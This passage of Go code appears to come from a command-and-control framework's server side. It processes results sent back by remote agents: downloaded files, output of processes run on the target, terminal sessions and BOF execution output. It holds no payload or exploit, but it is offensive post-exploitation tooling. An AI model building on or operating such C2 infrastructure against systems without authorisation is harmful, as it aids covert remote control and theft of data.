				fileId := fmt.Sprintf("%08x", params.FileId)

				if params.Start {
					_ = Ts.TsDownloadAdd(agentData.Id, fileId, params.Path, int64(params.Size))
				}

				_ = Ts.TsDownloadUpdate(fileId, 1, params.Content)

				if params.Finish {
					if params.Canceled {
						_ = Ts.TsDownloadClose(fileId, 4)
					} else {
						_ = Ts.TsDownloadClose(fileId, 3)
					}
				}

			case COMMAND_RUN:
				var params AnsRun
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					continue
				}

				task := taskData
				task.TaskId = job.JobId
				task.Completed = params.Finish

				if params.Start {
					task.Completed = false
					task.Message = fmt.Sprintf("Process started: PID = %d", params.Pid)
					task.ClearText = "\n"

				} else if params.Finish {
					task.Message = "Process finished"
					task.ClearText = "\n"

				} else {
					task.Completed = false
					task.Message = ""

					if len(params.Stderr) > 0 {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = "Stderr:"
						task.ClearText = params.Stderr
					}
					if len(params.Stdout) > 0 {
						task.ClearText = params.Stdout
					}
				}

				outTasks = append(outTasks, task)

			// NOTE: Tunnel commands no longer come through Type 2 (Job).
			// Tunnel MUX data flows in Type 1 (Command) via process_tunnels().

			case COMMAND_TERMINAL_START, COMMAND_TERMINAL_STOP:
				termTask := adaptix.TaskData{
					Type:    adaptix.TASK_TYPE_PROXY_DATA,
					AgentId: agentData.Id,
					Data:    job.Data,
					Sync:    false,
				}
				outTasks = append(outTasks, termTask)

			case COMMAND_EXEC_BOF_OUT:
				var bofOut AnsBofOutput
				if err := msgpack.Unmarshal(job.Data, &bofOut); err != nil {
					continue
				}

				task := taskData
				task.TaskId = job.JobId

				if bofOut.Type == 0xFF {
					// Sentinel: async BOF finished
					task.Message = "Async BOF finished"
					task.Completed = true
					task.ClearText = "\n"
				} else if bofOut.Type == CALLBACK_ERROR {
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF output"
					task.ClearText = bofOut.Output
					task.Completed = false
				} else if bofOut.Type >= 0x100 {
					// BOF error codes
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF error"
					task.ClearText = bofOut.Output
					task.Completed = true
				} else {
					task.MessageType = adaptix.MESSAGE_SUCCESS
					task.Message = "BOF output"
					task.ClearText = bofOut.Output
					task.Completed = false
				}

				outTasks = append(outTasks, task)
			}
		}
	}

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	_ = job

	return nil
}
